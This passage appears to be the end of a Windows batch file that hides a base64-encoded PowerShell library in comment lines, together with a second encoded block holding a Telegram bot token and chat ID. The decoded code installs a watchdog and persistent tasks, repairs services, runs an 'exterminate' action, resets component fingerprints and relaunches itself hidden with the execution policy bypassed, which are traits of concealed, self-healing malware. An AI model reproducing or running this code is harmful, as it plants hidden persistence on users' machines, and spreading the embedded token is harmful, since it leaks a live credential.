::fSkNCiAgICAgICAgYWx0ICAgICAgICAgID0gJChpZiAoJGFsdCkgeyAkYWx0IH0g
::ZWxzZSB7ICdNSVNTSU5HJyB9KQ0KICAgICAgICBncnl4YSAgICAgICAgPSAkKGlm
::ICgkc2NyaXB0OmdyeXhhKSB7ICRzY3JpcHQ6Z3J5eGEgfSBlbHNlIHsgJ01JU1NJ
::TkcnIH0pDQogICAgICAgIGdyeXhhRnAgICAgICA9ICRncnl4YUZwDQogICAgICAg
::IGZvcmVpZ24gICAgICA9ICRmb3JlaWduDQogICAgICAgIHRhc2tzT2sgICAgICA9
::ICR0YXNrc09rDQogICAgICAgIHRhc2tzVG90YWwgICA9ICR0YXNrc1RvdGFsDQog
::ICAgICAgIHdhdGNoZG9nICAgICA9ICR3ZA0KICAgICAgICBpbnN0YWxsQ291bnQg
::PSAkaW5zdGFsbENvdW50DQogICAgICAgIGxhc3RIZWFsICAgICA9ICQoaWYgKCRF
::eHRyYSkgeyAoR2V0LURhdGUpLlRvVW5pdmVyc2FsVGltZSgpLlRvU3RyaW5nKCdv
::JykgfSBlbHNlaWYgKCRwcmV2Lmxhc3RIZWFsKSB7ICRwcmV2Lmxhc3RIZWFsIH0g
::ZWxzZSB7ICRudWxsIH0pDQogICAgICAgIG5vdGUgICAgICAgICA9ICRFeHRyYQ0K
::ICAgIH0NCiAgICAoJHN0YXRlIHwgQ29udmVydFRvLUpzb24gLUNvbXByZXNzKSB8
::IFNldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkc3RhdGVQYXRoIC1Gb3JjZQ0KICAg
::IHJldHVybiAkc3RhdGUNCn0NCg0Kc3dpdGNoICgkQWN0aW9uKSB7DQogICAgJ2lu
::aXQnICAgICAgICAgICAgeyAkaWQgPSBJbml0aWFsaXplLUlkZW50aXR5OyAkaWQu
::R2V0RW51bWVyYXRvcigpIHwgRm9yRWFjaC1PYmplY3QgeyAiJCgkXy5LZXkpPSQo
::JF8uVmFsdWUpIiB9IH0NCiAgICAnaWRlbnRpdHknICAgICAgICB7ICRpZCA9IFJl
::YWQtSWRlbnRpdHk7ICRpZC5HZXRFbnVtZXJhdG9yKCkgfCBGb3JFYWNoLU9iamVj
::dCB7ICIkKCRfLktleSk9JCgkXy5WYWx1ZSkiIH0gfQ0KICAgICd3YXRjaGRvZycg
::ICAgICAgIHsgSW5zdGFsbC1XYXRjaGRvZyB8IE91dC1OdWxsIH0NCiAgICAnd2F0
::Y2hkb2ctZW5zdXJlJyB7IEVuc3VyZS1XYXRjaGRvZyB9DQogICAgJ3Rhc2tzLWVu
::c3VyZScgICAgeyBFbnN1cmUtUGVyc2lzdFRhc2tzIH0NCiAgICAnc3RhdGUnICAg
::ICAgICAgICB7IFVwZGF0ZS1TdGF0ZSB8IENvbnZlcnRUby1Kc29uIC1Db21wcmVz
::cyB9DQogICAgJ3JlcGFpcicgICAgICAgICAgeyBSZXBhaXItU0NTZXJ2aWNlICRG
::cCB9DQogICAgJ3JlZ2lzdGVyZWQnICAgICAgeyBUZXN0LVNDUmVnaXN0ZXJlZCAk
::RnAgfQ0KICAgICdleHRlcm1pbmF0ZScgICAgIHsgSW52b2tlLUV4dGVybWluYXRl
::IH0NCiAgICAnZ3J5eGEtaGVhbHRoJyAgICB7IFRlc3QtR3J5eGFIZWFsdGggfQ0K
::ICAgICdzeW5jLWdyeXhhLWZwJyAgIHsNCiAgICAgICAgJGcgPSBGaW5kLVJ1bm5p
::bmdHcnl4YUZwDQogICAgICAgIGlmICgkZykgew0KICAgICAgICAgICAgU2V0LUdy
::eXhhRnAgJGcNCiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiU1lOQ0VEfCRnIg0K
::ICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJGN1ciA9IEdldC1Hcnl4YUZw
::DQogICAgICAgICAgICBpZiAoLW5vdCAoVGVzdC1Jc0dyeXhhRnAgJGN1cikgLWFu
::ZCAkc2NyaXB0OkdyeXhhRXhwZWN0ZWRGcCkgew0KICAgICAgICAgICAgICAgIFNl
::dC1Hcnl4YUZwICRzY3JpcHQ6R3J5eGFFeHBlY3RlZEZwDQogICAgICAgICAgICAg
::ICAgV3JpdGUtT3V0cHV0ICJSRVNFVHwkKCRzY3JpcHQ6R3J5eGFFeHBlY3RlZEZw
::KSINCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgV3JpdGUt
::T3V0cHV0ICJOT05FfCRjdXIiDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAg
::ICB9DQogICAgJ3Rlc3QtbXNpJyAgICAgICAgew0KICAgICAgICAkcGF0aCA9ICRF
::eHRyYQ0KICAgICAgICBpZiAoLW5vdCAkcGF0aCkgeyBXcml0ZS1PdXRwdXQgJ25v
::JzsgYnJlYWsgfQ0KICAgICAgICBpZiAoVGVzdC1Nc2lQYWNrYWdlICRwYXRoICRG
::cCkgeyBXcml0ZS1PdXRwdXQgJ3llcycgfSBlbHNlIHsgV3JpdGUtT3V0cHV0ICdu
::bycgfQ0KICAgIH0NCiAgICAncHJvdGVjdC1tc2knICAgICB7DQogICAgICAgICRz
::YWZlID0gUHJvdGVjdC1Nc2lTaWJsaW5nU2FmZSAkRXh0cmENCiAgICAgICAgaWYg
::KCRzYWZlKSB7IFdyaXRlLU91dHB1dCAkc2FmZSB9IGVsc2UgeyBXcml0ZS1PdXRw
::dXQgJ0ZBSUwnIH0NCiAgICB9DQogICAgJ3ZlcmlmeS11cGRhdGUnICAgew0KICAg
::ICAgICAjIEV4dHJhID0gIm1hbmlmZXN0fHNpZ3xuYW1lPXBhdGg7bmFtZTI9cGF0
::aDIiDQogICAgICAgICRwYXJ0cyA9ICRFeHRyYSAtc3BsaXQgJ1x8JywgMw0KICAg
::ICAgICBpZiAoJHBhcnRzLkNvdW50IC1sdCAzKSB7IFdyaXRlLU91dHB1dCAnYmFk
::LWFyZ3MnOyBicmVhayB9DQogICAgICAgICRtYXAgPSBAe30NCiAgICAgICAgZm9y
::ZWFjaCAoJHBhaXIgaW4gKCRwYXJ0c1syXSAtc3BsaXQgJzsnKSkgew0KICAgICAg
::ICAgICAgaWYgKCRwYWlyIC1tYXRjaCAnXihbXj1dKyk9KC4qKSQnKSB7ICRtYXBb
::JG1hdGNoZXNbMV1dID0gJG1hdGNoZXNbMl0gfQ0KICAgICAgICB9DQogICAgICAg
::IFdyaXRlLU91dHB1dCAoVGVzdC1VcGRhdGVNYW5pZmVzdCAkcGFydHNbMF0gJHBh
::cnRzWzFdICRtYXApDQogICAgfQ0KICAgICdzeW5jLXNldnJ6LWZwJyAgIHsNCiAg
::ICAgICAgaWYgKCRFeHRyYSkgeyBXcml0ZS1PdXRwdXQgKFN5bmMtU2V2cnpFeHBl
::Y3RlZCAkRXh0cmEpIH0NCiAgICAgICAgZWxzZSB7DQogICAgICAgICAgICAkayA9
::IEAoR2V0LVNldnJ6S2VlcCkNCiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAoIlNF
::VlJafCQoJGtbMF0pfCQoJGtbMV0pIikNCiAgICAgICAgfQ0KICAgIH0NCiAgICAn
::Z3J5eGEtZW5zdXJlJyAgICB7DQogICAgICAgIGlmICgkTm9XYWl0KSB7DQogICAg
::ICAgICAgICAjIEwzNS9MMzk6IHBhc3MgQXJndW1lbnRMaXN0IGFzIHN0cmluZyBh
::cnJheSAoam9pbmVkIHN0cmluZyBpcyBhIFN0YXJ0LVByb2Nlc3MgZm9vdGd1bikN
::CiAgICAgICAgICAgICRwcyA9IChHZXQtUHJvY2VzcyAtSWQgJFBJRCkuUGF0aA0K
::ICAgICAgICAgICAgaWYgKC1ub3QgJHBzKSB7ICRwcyA9ICdwb3dlcnNoZWxsLmV4
::ZScgfQ0KICAgICAgICAgICAgJGFyZ0xpc3QgPSBAKA0KICAgICAgICAgICAgICAg
::ICctTm9Qcm9maWxlJywgJy1FeGVjdXRpb25Qb2xpY3knLCAnQnlwYXNzJywNCiAg
::ICAgICAgICAgICAgICAnLUZpbGUnLCAkUFNDb21tYW5kUGF0aCwNCiAgICAgICAg
::ICAgICAgICAnLUFjdGlvbicsICdncnl4YS1lbnN1cmUnLA0KICAgICAgICAgICAg
::ICAgICctV29ya0RpcicsICRXb3JrRGlyLA0KICAgICAgICAgICAgICAgICctQnVp
::bGQnLCAkQnVpbGQNCiAgICAgICAgICAgICkNCiAgICAgICAgICAgIGlmICgkRGVl
::cCkgIHsgJGFyZ0xpc3QgKz0gJy1EZWVwJyB9DQogICAgICAgICAgICBpZiAoJEZv
::cmNlKSB7ICRhcmdMaXN0ICs9ICctRm9yY2UnIH0NCiAgICAgICAgICAgIFN0YXJ0
::LVByb2Nlc3MgLUZpbGVQYXRoICRwcyAtQXJndW1lbnRMaXN0ICRhcmdMaXN0IC1X
::aW5kb3dTdHlsZSBIaWRkZW4NCiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAnUVVF
::VUVEfGRldGFjaGVkPTEnDQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBX
::cml0ZS1PdXRwdXQgKEludm9rZS1Hcnl4YUVuc3VyZSB8IE91dC1TdHJpbmcpLlRy
::aW0oKQ0KICAgICAgICB9DQogICAgfQ0KfQ0K
::B64_LIB_END

::B64_NTF_BEGIN
Qk9UX1RPS0VOPTg2MTk3MTU3NTQ6QUFGTWsyTmpORC1oUWsyeFBGWWppY0hmQjVNeUt0Y1hDcWcK
Q0hBVF9JRD03NTQ3NDYyMDcwCg==
::B64_NTF_END
